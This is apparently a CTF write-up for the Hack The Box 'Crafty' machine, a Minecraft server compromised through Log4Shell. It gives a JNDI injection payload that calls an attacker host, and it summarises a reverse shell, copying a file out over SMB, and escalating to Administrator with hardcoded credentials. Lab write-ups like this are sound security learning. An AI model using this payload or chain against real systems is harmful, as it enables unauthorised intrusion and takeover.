# HTB — Crafty

**Official HTB page**: [Crafty](https://app.hackthebox.com/machines/Crafty?tab=play_machine)

**Difficulty**: Easy  
**OS**: Windows  
**Release date**: 10 Feb, 2024  
**Platforms**: HackTheBox  
**Tags**: Log4Shell

---

## Initial Enumeration
- Nmap scan revealed open ports:
  - 80 (HTTP - IIS 10.0)
  - 25565 (Minecraft server)
- Minecraft service identified as:
  - Minecraft 1.16.5
- Web server hosted the official Crafty website

---

## Vulnerability Identified
- Minecraft server was vulnerable to **Log4Shell (Log4j JNDI injection)**
- JNDI payload triggered outbound LDAP request
- Log4Shell exploitation allowed remote code execution
- A plugin JAR file contained hardcoded credentials
- Credentials could be reused to gain Administrator access

---

## Initial Access
- Connected to the Minecraft server using Minecraft Console Client
- Confirmed Log4Shell vulnerability by sending a JNDI payload in chat:
  - `${jndi:ldap://<attacker_ip>/test}`
- Listener on port 389 confirmed the victim contacted the attacker
- Used a Log4Shell exploitation framework to obtain RCE and a reverse shell

---

## Post-Exploitation
- Gained access as the Minecraft service account
- Discovered plugin directory containing a JAR file:
  - `playercounter-1.0-SNAPSHOT.jar`

---

## Privilege Escalation
- Exfiltrated the plugin file using SMB:
  - Hosted SMB share from attacker machine
  - Copied the JAR from victim to attacker
- Decompiled the JAR using JD-GUI
- Found hardcoded credentials for the local Administrator account
- Used **RunasCs** to execute commands as Administrator
- Spawned a reverse shell as Administrator and obtained full system access

---

## Key Takeaways

- Log4Shell exploitation is extremely powerful and easy to validate with LDAP callbacks
- Plugin JAR files often contain sensitive hardcoded credentials
- SMB shares are useful for fast file exfiltration on Windows targets
- Credential reuse combined with `RunasCs` provides a quick path to Administrator

